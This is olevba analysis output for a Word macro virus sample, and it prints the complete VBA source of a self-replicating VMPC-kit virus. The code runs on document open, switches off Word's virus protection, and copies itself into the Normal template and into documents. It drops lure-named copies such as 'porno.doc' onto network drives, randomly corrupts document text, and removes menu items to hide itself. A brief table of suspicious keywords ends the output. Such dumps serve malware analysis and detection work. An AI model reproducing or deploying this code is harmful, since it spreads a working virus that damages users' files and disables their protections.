olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-edec9e7e4c35ba9f13498598de2ed12bc8a15ee5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-edec9e7e4c35ba9f13498598de2ed12bc8a15ee5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub qqqqqq()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 8648-KrDs99278648.c
    '=================================
    'This Virus Is: Qqqqqq.Poppy
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("qqqqqq").Export "c:\qqqqqq.drv"
ActiveDocument.ReadOnlyRecommended = False
BrPf = Int(Rnd * 1000)
If BrPf = 3 Then Call OiIl9927AoAn
MjLq = Int(Rnd * 100)
    If MjLq = 99 Then MsgBox "fff", vbSystemModal
If NormalTemplate.VBProject.VBComponents.Item("qqqqqq").Name <> "qqqqqq" Then GxBw8648496213 = True
If ActiveDocument.VBProject.VBComponents.Item("qqqqqq").Name <> "qqqqqq" Then VlAq49628 = True
If GxBw8648496213 = True And VlAq49628 = False Then Set NgGq496286483 = NormalTemplate.VBProject.VBComponents
If GxBw8648496213 = False And VlAq49628 = True Then Set NgGq496286483 = ActiveDocument.VBProject.VBComponents
NgGq496286483.import "c:\qqqqqq.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If VlAq49628 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
'VMPCK v1.0d [The Final Version?]
GfUiEyJh:
End Sub
Sub FileExit()
    On Error Resume Next
    Call qqqqqq
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call qqqqqq
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub OiIl9927AoAn()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "q"
            .Replacement.Text = "ww"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

